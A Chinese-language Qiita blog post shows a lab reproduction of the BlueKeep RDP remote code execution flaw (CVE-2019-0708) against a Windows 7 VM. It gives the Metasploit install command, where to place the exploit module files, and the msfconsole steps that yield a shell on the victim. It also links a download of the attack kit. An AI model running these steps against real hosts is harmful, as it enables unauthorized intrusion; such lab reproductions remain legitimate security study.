<!DOCTYPE html><html><head><meta charset="utf-8" /><title>CVE-2019-0708远程桌面代码执行漏洞复现 - Qiita</title><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport" /><meta content="#55c500" name="theme-color" /><meta content="XWpkTG32-_C4joZoJ_UsmDUi-zaH-hcrjF6ZC_FoFbk" name="google-site-verification" /><link href="/manifest.json" rel="manifest" /><link href="/opensearch.xml" rel="search" title="Qiita" type="application/opensearchdescription+xml" /><meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="8ghj2rw50ddebuPLXw9gzDPzh67lbf/ANdXBDkpYOSgmUIXkXnEP0EpHkG5fxVF5KjT3egHhonKjRG+SIMbRCA==" /><link rel="shortcut icon" type="image/x-icon" href="https://cdn.qiita.com/assets/favicons/public/production-4ff10c1e1e2b5fcb353ff9cafdd56c70.ico" /><link rel="apple-touch-icon" type="image/png" href="https://cdn.qiita.com/assets/favicons/public/apple-touch-icon-f9a6afad761ec2306e10db2736187c8b.png" /><link rel="stylesheet" media="all" href="https://cdn.qiita.com/assets/public/style-6bff14d1f507b026583146562ac8f60b.min.css" /><script defer="" src="https://cdn.polyfill.io/v2/polyfill.min.js"></script><script src="https://cdn.qiita.com/assets/public/bundle-397b3940d199f9e81d1c13d16ffebc88.min.js" defer="defer"></script><meta content="summary" name="twitter:card" /><meta content="@Qiita" name="twitter:site" /><meta property="og:type" content="article"><meta property="og:title" content="CVE-2019-0708远程桌面代码执行漏洞复现 - Qiita"><meta property="og:image" content="https://cdn.qiita.com/assets/qiita-fb-2887e7b4aad86fd8c25cea84846f2236.png"><meta property="og:description" content="### 漏洞环境
使用VMware Fusion安装Windows7 SP1模拟受害机

Windows7 SP1下载链接:`ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_..."><meta content="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961" property="og:url" /><meta content="Qiita" property="og:site_name" /><meta content="564524038" property="fb:admins" /><meta content="RDP" name="keywords" /></head><body><div class="allWrapper"><div data-hyperapp-app="GlobalHeader" data-hyperapp-props="{&quot;unreadNotificationsCount&quot;:null,&quot;realms&quot;:[{&quot;humanName&quot;:&quot;Qiita&quot;,&quot;isCurrentRealm&quot;:true,&quot;isQiita&quot;:true,&quot;isQiitaTeam&quot;:false,&quot;loggedInUser&quot;:null,&quot;teamId&quot;:null,&quot;url&quot;:&quot;https://qiita.com/&quot;}],&quot;teamFindUrl&quot;:&quot;https://teams-center.qiita.com/find_team&quot;,&quot;isTeamOnlyUser&quot;:null,&quot;currentUser&quot;:null}"><div class="st-Header" id="globalHeader"><div class="st-Header_container"><div class="st-Header_start"><a class="st-Header_logo mr-1" href="/"><svg viewBox="0 0 75 25" xmlns="http://www.w3.org/2000/svg"><title>Qiita</title><path d="M24.6 12.2C24.6 6.2 20 0 12.2 0 6.2 0 0 4.6 0 12.4c0 6 4.6 12.2 12.4 12.2 2.5 0 5-.8 7.1-2.3l3.6 3.6 1.6-1.6-3.4-3.4c2.1-2.3 3.3-5.3 3.3-8.7zm-12.4-10c5.7 0 10.2 4.4 10.2 10.1 0 4.9-3.8 10.1-10.1 10.1s-10.1-5.1-10.1-10c0-6.4 5.1-10.2 10-10.2zM30.5 7.1h2.1v17h-2.1zM31.5 4.8c-1 0-1.8-.8-1.8-1.8s.8-1.8 1.8-1.8 1.8.8 1.8 1.8-.8 1.8-1.8 1.8zM40 4.8c-1 0-1.8-.8-1.8-1.8S39 1.2 40 1.2s1.8.8 1.8 1.8S41 4.8 40 4.8zM39 7.1h2.1v17H39zM53.7 24.4c-3.9 0-6.2-3-6.2-6v-16h2.1v4.7H57v2.1h-7.4v9.3c0 1.9 1.5 3.9 4.1 3.9.7 0 1.4-.2 2-.6l.2-.1 1 1.8-.2.1c-.9.5-2 .8-3 .8zM67.6 24.5c-5.7 0-9.1-4.5-9.1-8.9 0-5.7 4.5-9.1 8.9-9.1 2.3 0 4.1.8 5.4 2.3V7.1h2.1v17h-2.1v-1.9c-1.2 1.5-3 2.3-5.2 2.3zm-.2-15.9c-3.4 0-6.8 2.6-6.8 7 0 3.4 2.6 6.8 7 6.8 2 0 4-.9 5.3-2.5v-8.8c-1.4-1.6-3.3-2.5-5.5-2.5z"></path></svg></a><div><div class="st-Header_realmSelector"><span class="fa fa-fw fa-caret-down"></span></div></div><div><div class="st-Header_community">Community<span class="fa fa-fw fa-caret-down ml-1of2"></span></div></div><form class="st-Header_search"><span class="fa fa-search"></span><input class="st-Header_searchInput" placeholder="Search" type="search" /></form><div class="st-Header_searchButton"><span class="fa fa-serach"></span></div></div><div class="st-Header_end"><a class="st-Header_signupButton" href="/signup">Signup</a><a class="st-Header_loginLink" href="/login">Login</a></div></div></div></div><div class="st-HeaderAlert st-HeaderAlert-warning"><div class="st-HeaderAlert_body"></div></div><script type="application/ld+json">{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"/","name":"Qiita"}},{"@type":"ListItem","position":2,"item":{"@id":"/tags/%23%3CQiita::Graph::Result:0x000055e0243455d0%3E","name":"RDP"}}]}</script><div data-hyperapp-app="PersonalPublicArticle" data-hyperapp-props="{&quot;article&quot;:{&quot;body&quot;:&quot;\n\u003ch3\u003e\n\u003cspan id=\&quot;漏洞环境\&quot; class=\&quot;fragment\&quot;\u003e\u003c/span\u003e\u003ca href=\&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83\&quot;\u003e\u003ci class=\&quot;fa fa-link\&quot;\u003e\u003c/i\u003e\u003c/a\u003e漏洞环境\u003c/h3\u003e\n\n\u003cp\u003e使用VMware Fusion安装Windows7 SP1模拟受害机\u003c/p\u003e\n\n\u003cp\u003eWindows7 SP1下载链接:\u003ccode\u003eed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\&quot;https://camo.qiitausercontent.com/8ce91b80350018d54cde160722673fc68a07c82b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f66306665303137312d663637632d633062662d353032302d3435333037393061616235322e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noopener\&quot;\u003e\u003cimg src=\&quot;https://camo.qiitausercontent.com/8ce91b80350018d54cde160722673fc68a07c82b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f66306665303137312d663637632d633062662d353032302d3435333037393061616235322e706e67\&quot; alt=\&quot;Windows7 SP1\&quot; data-canonical-src=\&quot;https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/491410/f0fe0171-f67c-c0bf-5020-4530790aab52.png\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3\u003e\n\u003cspan id=\&quot;exp\&quot; class=\&quot;fragment\&quot;\u003e\u003c/span\u003e\u003ca href=\&quot;#exp\&quot;\u003e\u003ci class=\&quot;fa fa-link\&quot;\u003e\u003c/i\u003e\u003c/a\u003eExp\u003c/h3\u003e\n\n\u003ch4\u003e\n\u003cspan id=\&quot;攻击工具准备\&quot; class=\&quot;fragment\&quot;\u003e\u003c/span\u003e\u003ca href=\&quot;#%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87\&quot;\u003e\u003ci class=\&quot;fa fa-link\&quot;\u003e\u003c/i\u003e\u003c/a\u003e攻击工具准备\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e1.使用如下命令一键安装metasploit-framework\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cdiv class=\&quot;code-frame\&quot; data-lang=\&quot;text\&quot;\u003e\u003cdiv class=\&quot;highlight\&quot;\u003e\u003cpre\u003ecurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \u0026gt; msfinstall \u0026amp;\u0026amp; chmod 755 msfinstall \u0026amp;\u0026amp; ./msfinstall\n\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n\n\u003cul\u003e\n\u003cli\u003e2.下载Reference中的攻击套件放置文件到msf的相应文件夹(如果已存在同名文件,直接覆盖即可)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cdiv class=\&quot;code-frame\&quot; data-lang=\&quot;text\&quot;\u003e\u003cdiv class=\&quot;highlight\&quot;\u003e\u003cpre\u003erdp.rb   -\u0026gt;   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb\nrdp_scanner.rb   -\u0026gt;   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb\ncve_2019_0708_bluekeep.rb   -\u0026gt;   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb\ncve_2019_0708_bluekeep_rce.rb   -\u0026gt;   /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb\n\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n\n\u003ch4\u003e\n\u003cspan id=\&quot;攻击命令\&quot; class=\&quot;fragment\&quot;\u003e\u003c/span\u003e\u003ca href=\&quot;#%E6%94%BB%E5%87%BB%E5%91%BD%E4%BB%A4\&quot;\u003e\u003ci class=\&quot;fa fa-link\&quot;\u003e\u003c/i\u003e\u003c/a\u003e攻击命令\u003c/h4\u003e\n\n\u003cp\u003e使用\u003ccode\u003emsfconsole\u003c/code\u003e进入metasploit-framework\u003cbr\u003e\n进入以后使用\u003ccode\u003ereload_all\u003c/code\u003e重新加载0708rdp利用模块\u003cbr\u003e\n使用\u003ccode\u003euse exploit/windows/rdp/cve_2019_0708_bluekeep_rce\u003c/code\u003e启用0708RDP攻击模块\u003cbr\u003e\n使用\u003ccode\u003einfo\u003c/code\u003e查看工具相关信息以及设置\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\&quot;https://camo.qiitausercontent.com/1519ad06908e8cd9a4c516d6b6ad892d1bd9156f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f35653766393333392d643739622d386433332d376664342d3865343263663531613434332e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noopener\&quot;\u003e\u003cimg src=\&quot;https://camo.qiitausercontent.com/1519ad06908e8cd9a4c516d6b6ad892d1bd9156f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f35653766393333392d643739622d386433332d376664342d3865343263663531613434332e706e67\&quot; alt=\&quot;info\&quot; data-canonical-src=\&quot;https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/491410/5e7f9339-d79b-8d33-7fd4-8e42cf51a443.png\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e可见关键设置主要为\u003ccode\u003eRHOSTS\u003c/code\u003e\\ \u003ccode\u003eRPORT\u003c/code\u003e \\ \u003ccode\u003etarget\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e使用\u003ccode\u003eset RHOSTS 受害机IP\u003c/code\u003e设置受害机IP\u003cbr\u003e\n使用\u003ccode\u003eset RPORT 受害机PORT\u003c/code\u003e设置受害机RDP端口号\u003cbr\u003e\n使用\u003ccode\u003eset target ID数字(可选为0-4)\u003c/code\u003e设置受害机机器架构\u003cbr\u003e\n这里我们使用的是VMware Fusion,那么target 3满足条件\u003cbr\u003e\n使用\u003ccode\u003eexploit\u003c/code\u003e开始攻击,等待建立连接\u003cbr\u003e\n\u003ca href=\&quot;https://camo.qiitausercontent.com/4a7733c6054eb5d2f33cee48cd501a78eb5627a2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f34326135306138632d343039612d663463642d376131662d3431626261303030613362342e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noopener\&quot;\u003e\u003cimg src=\&quot;https://camo.qiitausercontent.com/4a7733c6054eb5d2f33cee48cd501a78eb5627a2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f34326135306138632d343039612d663463642d376131662d3431626261303030613362342e706e67\&quot; alt=\&quot;exploit\&quot; data-canonical-src=\&quot;https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/491410/42a50a8c-409a-f4cd-7a1f-41bba000a3b4.png\&quot;\u003e\u003c/a\u003e\u003cbr\u003e\n建立连接以后,使用\u003ccode\u003eshell\u003c/code\u003e获得shell,再使用\u003ccode\u003epython\u003c/code\u003e获得交互式shell\u003cbr\u003e\n\u003ca href=\&quot;https://camo.qiitausercontent.com/09b2c8848724d7cdd1ee0779f73505538ff9a5b6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f61643261353733362d633132362d333063302d323533622d3364633935653839656539662e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noopener\&quot;\u003e\u003cimg src=\&quot;https://camo.qiitausercontent.com/09b2c8848724d7cdd1ee0779f73505538ff9a5b6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f61643261353733362d633132362d333063302d323533622d3364633935653839656539662e706e67\&quot; alt=\&quot;交互式shell\&quot; data-canonical-src=\&quot;https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/491410/ad2a5736-c126-30c0-253b-3dc95e89ee9f.png\&quot;\u003e\u003c/a\u003e\u003cbr\u003e\n随即完成攻击,成功拿到受害者主机权限\u003cbr\u003e\n\u003ca href=\&quot;https://camo.qiitausercontent.com/ff8c15b97602ef177aa66a25cc3bc664cf12b591/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f65626133393239642d643762342d323936322d613462652d6237366338396539343933662e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noopener\&quot;\u003e\u003cimg src=\&quot;https://camo.qiitausercontent.com/ff8c15b97602ef177aa66a25cc3bc664cf12b591/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f65626133393239642d643762342d323936322d613462652d6237366338396539343933662e706e67\&quot; alt=\&quot;主机权限\&quot; data-canonical-src=\&quot;https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/491410/eba3929d-d7b4-2962-a4be-b76c89e9493f.png\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3\u003e\n\u003cspan id=\&quot;reference\&quot; class=\&quot;fragment\&quot;\u003e\u003c/span\u003e\u003ca href=\&quot;#reference\&quot;\u003e\u003ci class=\&quot;fa fa-link\&quot;\u003e\u003c/i\u003e\u003c/a\u003eReference\u003c/h3\u003e\n\n\u003cp\u003e\u003ca href=\&quot;https://github.com/rapid7/metasploit-framework/pull/12283/files\&quot; class=\&quot;autolink\&quot; rel=\&quot;nofollow noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://github.com/rapid7/metasploit-framework/pull/12283/files\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\&quot;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708\&quot; class=\&quot;autolink\&quot; rel=\&quot;nofollow noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\&quot;https://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ\&quot; class=\&quot;autolink\&quot; rel=\&quot;nofollow noopener\&quot; target=\&quot;_blank\&quot;\u003ehttps://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ\u003c/a\u003e 提取码: mffr\u003c/p\u003e\n&quot;,&quot;createdAt&quot;:&quot;2019-09-07T00:24:32Z&quot;,&quot;elapsedYearsFromUpdatedAt&quot;:0,&quot;isDeprecated&quot;:false,&quot;isDestroyableByViewer&quot;:false,&quot;isEditRequestSendableByViewer&quot;:true,&quot;isLikableByViewer&quot;:true,&quot;isLikedByViewer&quot;:false,&quot;isPublic&quot;:true,&quot;isSlide&quot;:false,&quot;isStockableByViewer&quot;:true,&quot;isStockedByViewer&quot;:false,&quot;isUpdatableByViewer&quot;:false,&quot;isUpdated&quot;:false,&quot;likesCount&quot;:0,&quot;originalId&quot;:1013206,&quot;title&quot;:&quot;CVE-2019-0708远程桌面代码执行漏洞复现&quot;,&quot;toc&quot;:&quot;\u003cul\u003e\n\u003cli\u003e\n\u003ca href=\&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83\&quot;\u003e漏洞环境\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\&quot;#exp\&quot;\u003eExp\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003ca href=\&quot;#%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87\&quot;\u003e攻击工具准备\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\&quot;#%E6%94%BB%E5%87%BB%E5%91%BD%E4%BB%A4\&quot;\u003e攻击命令\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\&quot;#reference\&quot;\u003eReference\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n&quot;,&quot;totalPv&quot;:3413,&quot;updatedAt&quot;:&quot;2019-09-07T00:24:32Z&quot;,&quot;uuid&quot;:&quot;024b296a4c9ae7c33961&quot;,&quot;adventCalendarItem&quot;:null,&quot;author&quot;:{&quot;description&quot;:null,&quot;name&quot;:&quot;清水 川崎&quot;,&quot;profileImageUrl&quot;:&quot;https://qiita-user-profile-images.imgix.net/https%3A%2F%2Flh5.googleusercontent.com%2F-HWR7PSKNq7s%2FAAAAAAAAAAI%2FAAAAAAAAAAA%2FACHi3rdhFo9pFkqf7TQitSbMOWgzjRoObw%2Fs50%2Fphoto.jpg?ixlib=rb-1.2.2\u0026auto=compress%2Cformat\u0026lossless=0\u0026w=48\u0026s=ee7f3223899e4e61ce9a588790652390&quot;,&quot;profileImageUrlW48&quot;:&quot;https://qiita-user-profile-images.imgix.net/https%3A%2F%2Flh5.googleusercontent.com%2F-HWR7PSKNq7s%2FAAAAAAAAAAI%2FAAAAAAAAAAA%2FACHi3rdhFo9pFkqf7TQitSbMOWgzjRoObw%2Fs50%2Fphoto.jpg?ixlib=rb-1.2.2\u0026auto=compress%2Cformat\u0026lossless=0\u0026w=48\u0026s=ee7f3223899e4e61ce9a588790652390&quot;,&quot;profileImageUrlW75&quot;:&quot;https://qiita-user-profile-images.imgix.net/https%3A%2F%2Flh5.googleusercontent.com%2F-HWR7PSKNq7s%2FAAAAAAAAAAI%2FAAAAAAAAAAA%2FACHi3rdhFo9pFkqf7TQitSbMOWgzjRoObw%2Fs50%2Fphoto.jpg?ixlib=rb-1.2.2\u0026auto=compress%2Cformat\u0026lossless=0\u0026w=75\u0026s=dfa784560856366e43e2d30d3d8cbbfd&quot;,&quot;urlName&quot;:&quot;shimizukawasaki&quot;,&quot;isFollowedByViewer&quot;:false,&quot;isFollowableByViewer&quot;:true,&quot;websiteUrl&quot;:&quot;&quot;,&quot;organizations&quot;:{&quot;edges&quot;:[]}},&quot;tags&quot;:[{&quot;name&quot;:&quot;RDP&quot;,&quot;urlName&quot;:&quot;rdp&quot;}],&quot;followingLikers&quot;:{&quot;edges&quot;:[]},&quot;comments&quot;:{&quot;totalCount&quot;:0}},&quot;viewer&quot;:null,&quot;analyticsTrackingId&quot;:null}"><article itemscope="itemscope" itemtype="http://schema.org/Article" class="p-items"><div class="p-items_wrapper"><div class="p-items_container"><div class="p-items_stickyMenu it-Actions"><div class="it-Actions_item it-Actions_item-like likable"><a class="it-Actions_likeCount" href="/shimizukawasaki/items/024b296a4c9ae7c33961/likers">0</a><button><i class="fa fa-fw fa-thumbs-up"></i></button></div><div class="it-Actions_item it-Actions_item-stock"><button><i class="fa fa-folder-open"></i></button></div><div class="it-Actions_jumpToCommentButton"><div class="it-Actions_commentCount"></div><div class="fa fa-fw fa-comment"></div></div><div class="it-Actions_shareButton it-Actions_shareButton-twitter"><span class="fa fa-twitter"></span></div><div class="it-Actions_shareButton it-Actions_shareButton-facebook"><span class="fa fa-facebook"></span></div></div><div class="p-items_main"><div class="p-items_article"><div class="it-Header"><div class="u-flex-center-between mb-3"><div class="it-Header_info"><div class="it-Header_author"><a href="/shimizukawasaki"><img class="it-Header_authorImage" src="https://qiita-user-profile-images.imgix.net/https%3A%2F%2Flh5.googleusercontent.com%2F-HWR7PSKNq7s%2FAAAAAAAAAAI%2FAAAAAAAAAAA%2FACHi3rdhFo9pFkqf7TQitSbMOWgzjRoObw%2Fs50%2Fphoto.jpg?ixlib=rb-1.2.2&amp;auto=compress%2Cformat&amp;lossless=0&amp;w=48&amp;s=ee7f3223899e4e61ce9a588790652390" /></a><a class="it-Header_authorName" href="/shimizukawasaki">@shimizukawasaki</a> </div><div class="it-Header_time"><span>Posted at <time datetime="2019-09-07T00:00:00+09:00" itemprop="datePublished">2019-09-07</time></span></div><div class="it-Header_meta"><div class="it-Header_manipulate"><div class="dropdown"><span class="dropdown-toggle" tabindex="0"><span class="fa fa-ellipsis-h fa-lg"></span></span></div></div></div></div></div><h1 class="it-Header_title" itemprop="headline">CVE-2019-0708远程桌面代码执行漏洞复现</h1><div class="it-Tags"><a class="it-Tags_item" href="/tags/%23%3CQiita::Graph::Result:0x000055e0243455d0%3E"><span>RDP</span></a></div></div><div class="it-ActionsMobile"><div class="it-ActionsMobile_like likable"><button><span class="fa fa-fw fa-thumbs-up" /><span>0</span></button></div><div class="it-ActionsMobile_stock"><button><div class="fa fa-folder-open"></div></button></div></div><section class="it-MdContent" itemprop="articleBody"><div id="item-024b296a4c9ae7c33961"><p>
<h3>
<br /><span class="fragment"></span><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><i class="fa fa-link"></i></a>漏洞环境</h3></p>

<p><p>使用VMware Fusion安装Windows7 SP1模拟受害机</p></p>

<p><p>Windows7 SP1下载链接:<code>ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</code></p></p>

<p><p><a href="https://camo.qiitausercontent.com/8ce91b80350018d54cde160722673fc68a07c82b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f66306665303137312d663637632d633062662d353032302d3435333037393061616235322e706e67"><img src="https://camo.qiitausercontent.com/8ce91b80350018d54cde160722673fc68a07c82b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f66306665303137312d663637632d633062662d353032302d3435333037393061616235322e706e67" alt="Windows7 SP1"></a></p></p>

<p><h3>
<br /><span class="fragment"></span><a href="#exp"><i class="fa fa-link"></i></a>Exp</h3></p>

<p><h4>
<br /><span class="fragment"></span><a href="#%E6%94%BB%E5%87%BB%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"><i class="fa fa-link"></i></a>攻击工具准备</h4></p>

<p><ul>
<br /><li>1.使用如下命令一键安装metasploit-framework</li>
<br /></ul></p>

<p><div class="code-frame"><div class="highlight"><pre>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall
<br /></pre></div></div></p>

<p><ul>
<br /><li>2.下载Reference中的攻击套件放置文件到msf的相应文件夹(如果已存在同名文件,直接覆盖即可)</li>
<br /></ul></p>

<p><div class="code-frame"><div class="highlight"><pre>rdp.rb   -&gt;   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb
<br />rdp_scanner.rb   -&gt;   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb
<br />cve_2019_0708_bluekeep.rb   -&gt;   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
<br />cve_2019_0708_bluekeep_rce.rb   -&gt;   /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
<br /></pre></div></div></p>

<p><h4>
<br /><span class="fragment"></span><a href="#%E6%94%BB%E5%87%BB%E5%91%BD%E4%BB%A4"><i class="fa fa-link"></i></a>攻击命令</h4></p>

<p><p>使用<code>msfconsole</code>进入metasploit-framework<br>
<br />进入以后使用<code>reload_all</code>重新加载0708rdp利用模块<br>
<br />使用<code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code>启用0708RDP攻击模块<br>
<br />使用<code>info</code>查看工具相关信息以及设置</p></p>

<p><p><a href="https://camo.qiitausercontent.com/1519ad06908e8cd9a4c516d6b6ad892d1bd9156f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f35653766393333392d643739622d386433332d376664342d3865343263663531613434332e706e67"><img src="https://camo.qiitausercontent.com/1519ad06908e8cd9a4c516d6b6ad892d1bd9156f/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f35653766393333392d643739622d386433332d376664342d3865343263663531613434332e706e67" alt="info"></a></p></p>

<p><p>可见关键设置主要为<code>RHOSTS</code>\ <code>RPORT</code> \ <code>target</code></p></p>

<p><p>使用<code>set RHOSTS 受害机IP</code>设置受害机IP<br>
<br />使用<code>set RPORT 受害机PORT</code>设置受害机RDP端口号<br>
<br />使用<code>set target ID数字(可选为0-4)</code>设置受害机机器架构<br>
<br />这里我们使用的是VMware Fusion,那么target 3满足条件<br>
<br />使用<code>exploit</code>开始攻击,等待建立连接<br>
<br /><a href="https://camo.qiitausercontent.com/4a7733c6054eb5d2f33cee48cd501a78eb5627a2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f34326135306138632d343039612d663463642d376131662d3431626261303030613362342e706e67"><img src="https://camo.qiitausercontent.com/4a7733c6054eb5d2f33cee48cd501a78eb5627a2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f34326135306138632d343039612d663463642d376131662d3431626261303030613362342e706e67" alt="exploit"></a><br>
<br />建立连接以后,使用<code>shell</code>获得shell,再使用<code>python</code>获得交互式shell<br>
<br /><a href="https://camo.qiitausercontent.com/09b2c8848724d7cdd1ee0779f73505538ff9a5b6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f61643261353733362d633132362d333063302d323533622d3364633935653839656539662e706e67"><img src="https://camo.qiitausercontent.com/09b2c8848724d7cdd1ee0779f73505538ff9a5b6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f61643261353733362d633132362d333063302d323533622d3364633935653839656539662e706e67" alt="交互式shell"></a><br>
<br />随即完成攻击,成功拿到受害者主机权限<br>
<br /><a href="https://camo.qiitausercontent.com/ff8c15b97602ef177aa66a25cc3bc664cf12b591/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f65626133393239642d643762342d323936322d613462652d6237366338396539343933662e706e67"><img src="https://camo.qiitausercontent.com/ff8c15b97602ef177aa66a25cc3bc664cf12b591/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e61702d6e6f727468656173742d312e616d617a6f6e6177732e636f6d2f302f3439313431302f65626133393239642d643762342d323936322d613462652d6237366338396539343933662e706e67" alt="主机权限"></a></p></p>

<p><h3>
<br /><span class="fragment"></span><a href="#reference"><i class="fa fa-link"></i></a>Reference</h3></p>

<p><p><a href="https://github.com/rapid7/metasploit-framework/pull/12283/files" class="autolink">https://github.com/rapid7/metasploit-framework/pull/12283/files</a><br>
<br /><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" class="autolink">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708</a><br>
<br /><a href="https://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ" class="autolink">https://pan.baidu.com/s/1q-mbYQFtU1GBuJfThMk8VQ</a> 提取码: mffr</p>
